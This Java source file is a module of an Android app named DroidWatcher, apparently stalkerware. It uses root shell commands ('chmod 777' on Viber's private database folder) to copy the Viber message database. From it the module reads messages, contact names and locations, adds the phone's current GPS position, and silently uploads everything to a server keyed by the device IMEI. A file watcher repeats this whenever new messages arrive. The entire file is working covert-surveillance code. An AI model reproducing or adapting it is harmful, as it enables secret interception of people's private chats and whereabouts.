package com.droidwatcher.modules;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.lib.IMMessage;
import com.droidwatcher.modules.location.LocationModule;
import com.droidwatcher.services.AppService;
import com.droidwatcher.variables.ServerMessage;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.FileObserver;
import android.preference.PreferenceManager;

@SuppressLint("SdCardPath")
public class ViberModule implements OnSharedPreferenceChangeListener {	
	private static final String PATH_DB = "/data/data/com.viber.voip/databases/viber_messages";
	private static final String[] MESSAGES_COLUMNS = new String[] {"address", "type", "body", "date", "location_lat", "location_lng"};
	private static final String[] CONTACTS_COLUMNS = new String[] { "display_name", "number" };
	private static final String SETTINGS_LASTDATE = "lastdate_vb";
	
	private String LOCAL_PATH_DB;
	
	private Context mContext;
	private SettingsManager mSettings;
	private long mLastMsgTimestamp;
	private FileObserver mObserver;
	private HashMap<String, String> mUsernames;
	private boolean mIsStarted;

	public ViberModule(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mUsernames = new HashMap<String, String>();
		this.mIsStarted = false;
		
		LOCAL_PATH_DB = FileUtil.getFullPath(context, "viber_messages");
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("VB_ENABLED")){
			if (mSettings.isViberEnabled()) {
				if (!mIsStarted) {
					start();
				}
			}
			else{
				if (mIsStarted) {
					stop();
				}
			}
		}
	}
	
	private static String getDbPath(){
		if (!new java.io.File(PATH_DB).exists()) {
			if (new java.io.File(PATH_DB + ".db").exists()) {
				return PATH_DB + ".db";
			}
		}
		
		return PATH_DB;
	}
	
	public synchronized void start(){
		if (!mSettings.isViberEnabled()) {
			return;
		}
		
		if (!isViberAvailable()) {
			return;
		}
		
		if (!AppService.isRootAvailable()) {
			return;
		}
		
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.viber.voip/databases/*",
				"chmod 777 /data/data/com.viber.voip/databases",
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"));
			
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				FileUtil.copyFile(getDbPath(), LOCAL_PATH_DB);
				
				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
				mLastMsgTimestamp = settings.getLong(SETTINGS_LASTDATE, getLastMsgTimestamp());
				mObserver = new ViberFileObserver();
				
				Debug.i("[ViberModule] Start watching");
				mObserver.startWatching();
				
				mIsStarted = true;
			}
		});
		
		try {
			RootTools.getShell(true).add(command);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void stop() {
		mIsStarted = false;
		
		try {
			saveLastMsgTimestamp(mLastMsgTimestamp);
			if (mObserver != null) {
				mObserver.stopWatching();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			
		} finally {
			mObserver = null;
		}
	}
	
	public void dispose(){
		stop();
	}
	
	protected synchronized void getNewChat(){
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.viber.voip/databases/*",
				"chmod 777 /data/data/com.viber.voip/databases");
		
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				_getNewChat();
			}
		});
		
		try {
			RootTools.getShell(true).add(command);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void _getNewChat(){
		if (!FileUtil.copyFile(getDbPath(), LOCAL_PATH_DB)) {
			return;
		}
		
		SQLiteDatabase db = null;
		
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_DB, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			ArrayList<IMessageBody> list = getMessages(db);
			
			if (list == null) {
				return;
			}
			
			final long lastMsgTimestamp = mLastMsgTimestamp;
			mLastMsgTimestamp = getLastMsgTimestamp(db);
			
			db.close();
			db = null;
			
			if (list != null && list.size() > 0 && networkAvailable()) {
				new ServerMessanger(
					mContext,
					new ServerMessage(MessageType.VB, mSettings.imei(), mSettings.login(), list),
					new ServerMessanger.ICallBack() {
						@Override
						public boolean onFinished(String response) { return false; }

						@Override
						public void onError() {
							mLastMsgTimestamp = lastMsgTimestamp;
						}

						@Override
						public void onSuccess() {
							saveLastMsgTimestamp(mLastMsgTimestamp);
						}
					}
				).start();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
		}
	}
	
	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db){
		Cursor c = null;
		try {
			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
			IMMessage message;
			long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
			c = db.query("messages", MESSAGES_COLUMNS, "date > " + mLastMsgTimestamp, null, null, null, null);
			while (c.moveToNext()) {
				String number = c.getString(0);
				int type = c.getInt(1) + 1; /* c.getInt(1) == 1 - is out;*/
				String text = c.getString(2);
				long date = c.getLong(3); /* time */
				long lat = c.getLong(4); /* lat */
				long lon = c.getLong(5); /* lon */
				
				message = new IMMessage(date, text, getUserName(number), type);
				
				if (type == 2 && lat != 0 && lon != 0) {
					message.addLocationViber(lat, lon);
				}
				else{
					if (date >= timeout) {
						Location location = LocationModule.getLocation(mContext);
						if (location != null) {
							message.addLocation(location.getLatitude(), location.getLongitude());
						}
					}
				}
				
				messages.add(message);
			}
			
			return messages;
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return null;
			
		} finally {
			if (c != null) {
				c.close();
			}
		}
	}
	
	private synchronized String getUserName(String number){
		if (mUsernames.containsKey(number)) {
			return mUsernames.get(number);
		}
		
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_DB, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.query("participants_info",  CONTACTS_COLUMNS, "number = ?", new String[] { number }, null, null, null);
			
			if (c.moveToFirst()) {
				String username = c.getString(0) + " (" + c.getString(1) + ")";
				mUsernames.put(number, username);
				return username;
			}
			
			return number;
			
		} catch(Exception e){
			Debug.exception(e);
			return number;
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastMsgTimestamp(){
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_DB, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.rawQuery("SELECT MAX(date) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastMsgTimestamp(SQLiteDatabase db){
		Cursor c = null;
		try {
			c = db.rawQuery("SELECT MAX(date) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private Boolean isViberAvailable(){
		try {
			mContext.getPackageManager().getPackageInfo("com.viber.voip", PackageManager.GET_ACTIVITIES);
			return true;
			
		} catch (NameNotFoundException e) {
			return false;
		}
	}
	
	private synchronized void saveLastMsgTimestamp(long lastMsgTimestamp){
		if (lastMsgTimestamp == 0) {
			return;
		}
		
		SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
		Editor editor = settings.edit();
		editor.putLong(SETTINGS_LASTDATE, lastMsgTimestamp);
		editor.commit();
	}
	
	private Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}

	private class MyCommandCapture extends CommandCapture{
		private ICommandCallback callback;
		
		public MyCommandCapture(String... command){
			super(0, command);
		}
		
		public void setCallback(ICommandCallback callback){
			this.callback = callback;
		}
		
		@Override
		public void commandCompleted(int id, int exitcode) {
			if (callback != null) {
				callback.run();
			}
		}
	}
	
	private interface ICommandCallback{
		public void run();
	}
	
	private class ViberFileObserver extends FileObserver {
		private static final long UPDATE_TIOMEOUT = 2 * 1000L;
		
		private long lastUpdate;

		public ViberFileObserver() {
			super(getDbPath(), FileObserver.MODIFY);
		}

		@Override
		public synchronized void onEvent(int event, String path) {
			Debug.i("onEvent: " + event + "; Path: " + path);
			
			long now = Calendar.getInstance().getTimeInMillis();
			if (now - lastUpdate < UPDATE_TIOMEOUT) {
				return;
			}

			lastUpdate = now;

			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						Thread.sleep(UPDATE_TIOMEOUT);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}

					getNewChat();
				}
			}).start();

		}
	}
}
